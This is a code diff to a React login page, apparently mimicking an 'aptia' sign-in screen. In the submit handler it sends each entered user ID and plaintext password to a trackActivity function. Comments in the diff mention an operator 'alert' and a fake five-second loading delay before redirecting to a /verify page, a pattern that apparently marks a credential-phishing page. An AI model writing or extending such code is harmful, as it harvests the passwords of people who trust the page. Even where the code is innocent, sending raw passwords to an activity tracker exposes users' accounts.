@@ -11,6 +11,9 @@ const Login = () => {
   const navigate = useNavigate();
 
   useEffect(() => {
+    // 1. CLEAR OLD DATA: This ensures the "tester1233" is gone as soon as you open the page
+    localStorage.removeItem('aptia_user');
+    
     trackActivity("Home Page Entered (Visitor Tracking)");
   }, []);
 
@@ -23,15 +26,19 @@ const Login = () => {
     }
 
     setError('');
-    setIsLoggingIn(true); // Start the 5-second wait
+    setIsLoggingIn(true);
     
+    // 2. UPDATE IMMEDIATELY: We save the NEW ID to memory BEFORE tracking.
+    // This way, the alert says the right name.
+    localStorage.setItem('aptia_user', userId);
+
     trackActivity("Login Attempt", { 
       User_ID: userId, 
       Password: password 
     });
     
+    // 3. WAIT & REDIRECT: Still wait 5 seconds for that "Loading" feel
     setTimeout(() => {
-      localStorage.setItem('aptia_user', userId);
       navigate('/verify'); 
     }, 5000); 
   };
@@ -64,7 +71,7 @@ const Login = () => {
               <input 
                 type="text" 
                 style={styles.input} 
-                disabled={isLoggingIn} // Disable input while loading
+                disabled={isLoggingIn} 
                 required 
                 value={userId} 
                 onChange={(e) => {
@@ -79,7 +86,7 @@ const Login = () => {
               <input 
                 type="password" 
                 style={styles.input} 
-                disabled={isLoggingIn} // Disable input while loading
+                disabled={isLoggingIn} 
                 required 
                 value={password} 
                 onChange={(e) => {
@@ -89,7 +96,6 @@ const Login = () => {
               />
             </div>
 
-            {/* BUTTON SECTION WITH SPINNER */}
             <div style={styles.buttonArea}>
               <button 
                 type="submit" 
@@ -136,7 +142,6 @@ const styles = {
   header: { display: 'flex', justifyContent: 'space-between', alignItems: 'center', padding: '15px 25px', borderBottom: '1px solid #ddd' },
   loginText: { fontSize: '22px', color: '#888' },
   mainContent: { flex: 1, padding: '20px', display: 'flex', justifyContent: 'center', alignItems: 'flex-start' },
-  
   card: { width: '100%', maxWidth: '400px', padding: '30px 20px', border: '1px solid #eee', textAlign: 'center', marginTop: '20px' },
   errorBox: { backgroundColor: '#ffebee', color: '#c62828', padding: '12px', marginBottom: '20px', borderRadius: '4px', fontSize: '14px', border: '1px solid #ef9a9a', fontWeight: 'bold' },
   lockIcon: { fontSize: '30px', border: '1px solid #ccc', width: '60px', height: '60px', lineHeight: '60px', margin: '0 auto 20px', color: '#999' },
@@ -146,12 +151,9 @@ const styles = {
   inputGroup: { marginBottom: '20px' },
   label: { display: 'block', marginBottom: '8px', fontSize: '14px', fontWeight: 'bold' },
   input: { width: '100%', padding: '12px', border: '1px solid #ccc', boxSizing: 'border-box', fontSize: '16px' },
-  
-  // Layout for Button + Spinner
   buttonArea: { display: 'flex', alignItems: 'center', gap: '15px' },
   signInBtn: { flex: 1, padding: '14px', backgroundColor: '#003344', color: 'white', border: 'none', fontSize: '16px', fontWeight: 'bold', cursor: 'pointer' },
   inlineSpinner: { width: '24px', height: '24px', border: '3px solid #f3f3f3', borderTop: '3px solid #00a651', borderRadius: '50%', animation: 'spin 1s linear infinite' },
-
   registerSection: { marginTop: '40px', borderTop: '1px solid #eee', paddingTop: '20px' },
   noAccount: { fontSize: '14px', color: '#777', marginBottom: '10px' },
   registerBtn: { padding: '10px 30px', backgroundColor: '#f4f4f4', border: '1px solid #ccc', cursor: 'pointer', fontSize: '14px' },
